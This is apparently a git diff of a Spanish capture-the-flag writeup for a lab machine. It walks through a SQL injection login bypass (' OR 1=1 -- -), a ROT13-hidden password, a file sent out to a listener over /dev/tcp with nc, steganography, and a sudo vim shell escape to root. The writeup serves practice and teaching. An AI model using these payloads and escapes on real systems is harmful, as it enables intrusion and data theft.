@@ -1,7 +1,7 @@
 # internship - Writeup
 
 ## Resumen 
-lorem ipsum
+Esta máquina presenta una vulnerabilidad de SQL Injection que aprovechamos para bypasear el login, donde encontramos una pista cifrada en ROT13 con la contraseña de un pasante. Usamos esa contraseña para acceder a un usuario del servidor SSH, y luego abusamos de un script con permisos de escritura vulnerables para pivotar a otro usuario. Finalmente, mediante la extracción de información oculta en un archivo JPEG (esteganografía), obtuvimos la contraseña para escalar privilegios a root.
 
 ## Paso N1: Reconocimiento 
 Empezamos escaneando los puertos TCP de la máquina con el siguiente comando:
@@ -24,7 +24,10 @@ Por lo que ahora, configuraremos ```/etc/hosts``` para acceder a la página, de 
 ```
 
 ## Paso N3: SQL Injection
-Ahora sí, una vez dentro de la página, podremos acceder a una pestaña de loggin, en la cuál pide un usuario y una contraseña, por lo que intentamos hacer una SQLi de la siguiente manera:
+Ahora sí, una vez dentro de la página, podremos acceder a una pestaña de login, en la cuál pide un usuario y una contraseña, por lo que intentamos hacer una SQLi de la siguiente manera:
+```
+' OR 1=1 -- -
+```
 ![]()
 
 ```' OR 1=1 -- -``` funciona de la siguiente manera: ```'``` sirve para cerrar la cadena de texto donde se encuentra el input, ```OR 1=1``` se usa como un condicional, para que devuelva TRUE, haciendo que la condicion se cumpla sin importar los datos reales, ```-- -``` los primero dos guíones sirven para comentar el resto de la línea, el espacio y guíon restante sirve de relleno para asegurar que la inyección se ejecute correctamente, por lo que ahora tenemos acceso a la página.
@@ -40,7 +43,7 @@ Y encontramos el subdirectorio /spam, que al hacerle un ```curl``` (o en su defe
 ```
 <!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
 ```
-Por intuición, supe que era un cifrado ROT13, por lo que procedo a descifrarlo de manera online y queda el siguiente texto
+Por intuición, supe que era un cifrado ROT13, por lo que procedo a descifrarlo de manera online y queda el siguiente texto:
 ```
 <!-- La contraseña de uno de los pasantes es 'purpl3' -->
 ```
@@ -66,5 +69,5 @@ Para pasarlo, escucharemos en una terminal con ```nc -lvnp 435 > test.jpeg``` y 
 ```
 cat profile_picture.jpeg > /dev/tcp/172.17.0.1/435
 ```
-Ahora que tenemos el contenido de ```profile_picture.jpeg```, podemos ver si tiene algun mensaje oculto con ```steghide extract -sf test.jpeg``` y nos deja un archivo llamado secret.txt, el cual al abrirlo, vemos que tiene el mensaje 'mag1ck'. el cual es la contraseña para poder escalar a root en valentina.
+Ahora que tenemos el contenido de ```profile_picture.jpeg```, podemos ver si tiene algun mensaje oculto con ```steghide extract -sf test.jpeg``` y nos deja un archivo llamado secret.txt, el cual al abrirlo, vemos que tiene el mensaje 'mag1ck', seguido, ejecutamos ```sudo vim -c ':!/bin/sh'``` en valentina, usando de contraseña ```mag1ck``` y nos convertimos en root.
 
